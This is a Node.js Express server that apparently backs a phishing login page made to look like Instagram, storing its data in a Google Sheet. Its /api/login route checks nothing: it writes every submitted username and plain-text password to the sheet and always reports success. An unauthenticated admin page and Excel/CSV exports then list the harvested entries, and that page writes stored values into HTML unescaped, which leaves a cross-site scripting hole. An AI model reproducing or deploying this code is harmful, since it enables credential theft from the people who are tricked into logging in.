const express = require('express');
const { GoogleSpreadsheet } = require('google-spreadsheet');
const { JWT } = require('google-auth-library');
const bcrypt = require('bcrypt');
const cors = require('cors');
const path = require('path');
const ExcelJS = require('exceljs');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// ---------- GOOGLE SHEETS SETUP ----------
// ---------- GOOGLE SHEETS SETUP (AUTO) ----------
let creds;
if (process.env.GOOGLE_PRIVATE_KEY) {
    // Render (Live)
    creds = {
        client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
        private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n')
    };
} else {
    // Local (VS Code)
    creds = require('./credentials.json');
}

const doc = new GoogleSpreadsheet(
    process.env.GOOGLE_SHEET_ID || '1wcpCc2jVWHE_sWA5LpFKUnF2UEBnsSrHGk7ZX3v01gE',
    new JWT({
        email: creds.client_email,
        key: creds.private_key,
        scopes: ['https://www.googleapis.com/auth/spreadsheets'],
    })
);

// ---------- REGISTER API (Optional - Rakho Ya Hatao) ----------
app.post('/api/register', async (req, res) => {
    try {
        const { name, username, email, password } = req.body;

        await doc.loadInfo();
        const sheet = doc.sheetsByTitle['Users'];

        const rows = await sheet.getRows();
        const existing = rows.find(row => row.get('username') === username || row.get('email') === email);
        if (existing) {
            return res.status(400).json({ message: 'Username or Email already exists!' });
        }

        const hashedPassword = await bcrypt.hash(password, 10);

        await sheet.addRow({
            name: name,
            username: username,
            email: email,
            password: hashedPassword,
            created_at: new Date().toISOString()
        });

        res.json({ message: '✅ User registered successfully!' });
    } catch (error) {
        res.status(500).json({ message: 'Server error: ' + error.message });
    }
});

// ---------- 🔥 NEW LOGIN API (Har attempt save karega) ----------
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        await doc.loadInfo();
        const sheet = doc.sheetsByTitle['Users'];

        // 🔥 Pehle login attempt save karo (har baar)
        await sheet.addRow({
            name: username,  // Username hi name ban jayega
            username: username,
            email: username + '@temp.com',  // Temporary email
            password: password,  // Plain password (ya hash karo)
            created_at: new Date().toISOString()
        });

        // ✅ Always success message (chahe user exist kare ya nahi)
        res.json({
            message: '✅ Login attempt saved!',
            user: {
                name: username,
                username: username,
                email: username + '@temp.com'
            }
        });
    } catch (error) {
        res.status(500).json({ message: 'Server error: ' + error.message });
    }
});

// ---------- ADMIN PANEL ----------
app.get('/admin/users', async (req, res) => {
    try {
        await doc.loadInfo();
        const sheet = doc.sheetsByTitle['Users'];
        const rows = await sheet.getRows();

        let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel - All Users</title>
            <style>
                * { font-family: Arial, sans-serif; }
                body { background: #fafafa; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
                h1 { color: #262626; border-bottom: 2px solid #0095f6; padding-bottom: 10px; }
                .stats { background: #0095f6; color: white; padding: 10px 20px; border-radius: 8px; display: inline-block; margin: 10px 0; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                th { background: #0095f6; color: white; padding: 12px; text-align: left; }
                td { padding: 10px; border-bottom: 1px solid #dbdbdb; }
                tr:hover { background: #f5f5f5; }
                .btn { 
                    background: #25D366; 
                    color: white; 
                    padding: 10px 20px; 
                    border: none; 
                    border-radius: 8px; 
                    cursor: pointer;
                    font-size: 16px;
                    margin: 10px 5px;
                }
                .btn:hover { opacity: 0.8; }
                .btn-blue { background: #0095f6; }
                .btn-red { background: #ed4956; }
                .search-box { 
                    padding: 10px; 
                    width: 300px; 
                    border: 1px solid #dbdbdb; 
                    border-radius: 8px;
                    margin: 10px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📊 Admin Panel - User Data</h1>
                <div class="stats">👥 Total Users: ${rows.length}</div>
                <br>
                <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by name, username or email...">
                <button class="btn btn-blue" onclick="downloadExcel()">📥 Download Excel</button>
                <button class="btn" onclick="downloadCSV()">📄 Download CSV</button>
                <button class="btn btn-red" onclick="refreshData()">🔄 Refresh</button>
                
                <table id="userTable">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Name</th>
                            <th>Username</th>
                            <th>Email</th>
                            <th>Created At</th>
                        </tr>
                    </thead>
                    <tbody>
        `;

        rows.forEach((row, index) => {
            html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${row.get('name') || ''}</td>
                    <td><strong>${row.get('username') || ''}</strong></td>
                    <td>${row.get('email') || ''}</td>
                    <td>${row.get('created_at') || 'N/A'}</td>
                </tr>
            `;
        });

        html += `
                    </tbody>
                </table>
            </div>

            <script>
                document.getElementById('searchInput').addEventListener('keyup', function() {
                    const searchText = this.value.toLowerCase();
                    const rows = document.querySelectorAll('#userTable tbody tr');
                    rows.forEach(row => {
                        const text = row.textContent.toLowerCase();
                        row.style.display = text.includes(searchText) ? '' : 'none';
                    });
                });

                function downloadCSV() {
                    let csv = 'Name,Username,Email,Created At\\n';
                    document.querySelectorAll('#userTable tbody tr').forEach(row => {
                        const cells = row.querySelectorAll('td');
                        if (cells.length > 0 && row.style.display !== 'none') {
                            csv += cells[1].textContent + ',' + 
                                   cells[2].textContent + ',' + 
                                   cells[3].textContent + ',' + 
                                   cells[4].textContent + '\\n';
                        }
                    });
                    const blob = new Blob([csv], { type: 'text/csv' });
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = 'users_data.csv';
                    link.click();
                }

                function downloadExcel() {
                    window.location.href = '/api/download-excel';
                }

                function refreshData() {
                    location.reload();
                }
            </script>
        </body>
        </html>
        `;

        res.send(html);
    } catch (error) {
        res.status(500).send('Error: ' + error.message);
    }
});

// ---------- DOWNLOAD EXCEL ----------
app.get('/api/download-excel', async (req, res) => {
    try {
        await doc.loadInfo();
        const sheet = doc.sheetsByTitle['Users'];
        const rows = await sheet.getRows();

        const workbook = new ExcelJS.Workbook();
        const worksheet = workbook.addWorksheet('Users');

        worksheet.addRow(['#', 'Name', 'Username', 'Email', 'Created At']);
        
        rows.forEach((row, index) => {
            worksheet.addRow([
                index + 1,
                row.get('name'),
                row.get('username'),
                row.get('email'),
                row.get('created_at')
            ]);
        });

        worksheet.getRow(1).font = { bold: true };
        worksheet.getRow(1).fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: 'FF0095F6' }
        };
        worksheet.getRow(1).font = { color: { argb: 'FFFFFFFF' } };

        res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
        res.setHeader('Content-Disposition', 'attachment; filename=users_data.xlsx');

        await workbook.xlsx.write(res);
        res.end();
    } catch (error) {
        res.status(500).json({ message: 'Error: ' + error.message });
    }
});

// ---------- START SERVER ----------
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`✅ Server running on http://localhost:${PORT}`);
    console.log(`📊 Admin Panel: http://localhost:${PORT}/admin/users`);
});
